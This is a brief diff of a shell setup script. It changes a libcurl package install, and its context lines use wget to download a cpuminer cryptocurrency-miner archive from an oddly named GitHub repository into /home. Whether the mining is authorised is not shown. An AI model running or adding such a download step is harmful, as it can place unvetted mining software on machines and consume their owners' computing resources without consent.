@@ -1,5 +1,5 @@
 apt-get update -y
-apt-get install -y libcurl3
+apt-get install libcurl4 -y
 cd /home
 wget https://github.com/jotmbtmyejhle/batch/raw/main/cpuminer-gr-1.2.4.1-x86_64_linux.7z
 apt update
